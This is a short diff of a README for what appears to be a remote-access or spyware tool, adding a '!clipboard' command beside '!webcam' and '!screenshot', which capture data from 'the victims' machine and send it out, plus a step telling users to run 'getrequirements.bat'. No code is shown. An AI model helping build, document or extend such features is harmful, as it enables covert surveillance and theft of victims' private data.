@@ -13,6 +13,7 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 
 1. !webcam -- Take an image of the webcam and send it
 2. !screenshot -- Takes an screenshot of the victims monitor and send it
+3. !clipboard -- Takes the content of the victims clipboard and sends it
 
 
 # SUPPORTED BROWSERS 
